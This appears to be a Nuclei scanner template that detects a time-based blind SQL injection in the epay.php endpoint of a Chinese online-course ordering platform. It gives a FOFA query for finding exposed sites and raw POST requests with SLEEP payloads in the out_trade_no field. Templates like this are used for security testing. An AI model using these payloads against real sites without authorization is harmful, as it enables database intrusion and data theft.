id: 29wangke-epay-sql-injection

info:
  name: 29网课交单平台 epay.php SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="Ashx/Usermanager.ashx"
    29网课交单平台 /epay/epay.php接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
  reference:
    - 
  tags: sql injection

http:
  - raw:
      - |
        POST /epay/epay.php HTTP/1.1 
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Type: application/x-www-form-urlencoded

        out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(4)))eEcA) AND 'aEmC'='aEmC
      - |
        POST /epay/epay.php HTTP/1.1 
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Type: application/x-www-form-urlencoded

        out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(8)))eEcA) AND 'aEmC'='aEmC

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"